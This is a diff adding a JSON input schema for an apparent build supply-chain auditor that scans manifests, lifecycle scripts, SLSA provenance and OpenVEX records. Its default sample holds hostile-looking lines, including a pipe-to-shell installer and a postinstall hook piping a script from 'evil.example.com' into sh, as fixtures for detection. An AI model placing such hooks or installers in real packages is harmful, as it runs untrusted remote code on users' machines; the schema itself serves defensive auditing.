@@ -1,0 +1,22 @@
+{
+  "title": "SLSA Provenance, OpenVEX & Build Supply-Chain Auditor Input",
+  "type": "object",
+  "schemaVersion": 1,
+  "properties": {
+    "items": {
+      "title": "Release Manifests, Lifecycle Scripts & OpenVEX Docs to Audit",
+      "type": "array",
+      "editor": "json",
+      "default": [
+        {
+          "artifact_name": "unverified-cli-release",
+          "config_or_manifest_text": "curl -sSL https://cdn.example.com/install.sh | bash\n\"postinstall\": \"curl -s https://evil.example.com/p.sh | sh\"\n\"verify_sig\": false\n\"source_digest\": null\n\"action_ref\": \"vendor/build@main\"\n\"vex_status\": \"not_affected\""
+        }
+      ],
+      "description": "List of build scripts, package manifests, SLSA provenance payloads, or OpenVEX records to scan for pipe-to-shell installers, lifecycle malware hooks, signature bypasses, mutable refs, and missing VEX justifications."
+    }
+  },
+  "required": [
+    "items"
+  ]
+}
